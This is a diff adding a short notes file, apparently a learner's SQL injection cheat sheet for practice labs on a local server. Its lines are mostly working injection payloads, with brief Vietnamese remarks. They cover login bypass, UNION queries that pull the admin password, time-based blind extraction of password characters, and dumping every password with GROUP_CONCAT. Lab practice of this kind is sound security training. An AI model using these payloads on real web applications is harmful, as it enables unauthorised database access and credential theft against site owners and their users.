@@ -1,0 +1,27 @@
+DEMO
+
+Level 1: (Error based)
+admin'--<space>
+'or 1--<space>
+'or 1=1--<space>
+Level 2: UNION Based
+'UNION SELECT NULL,password from users WHERE username='admin'-- 
+Level 3: Boolean based
+product_id='or+1=1--%20
+
+Timebased:Level 2
+Payload: xác định bang:-1' OR (IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users') > 0, SLEEP(5), 0)) -- 
+Payload khai thác password: -1' OR (IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 'a', SLEEP(1), 0)) -- 
+Trong trường hợp substring k dung duoc thi sao? -> mid
+Second Order:
+
+'UNION SELECT NULL,GROUP_CONCAT(password),NULL from users-- '
+
+
+Lab1: 
+http://localhost:8082/index.php?id=admin%27--%20&pw=abcd
+payload: admin'-- &pw=abcd
+
+Baby SQL (OOB) 
+
+Order by lab: 
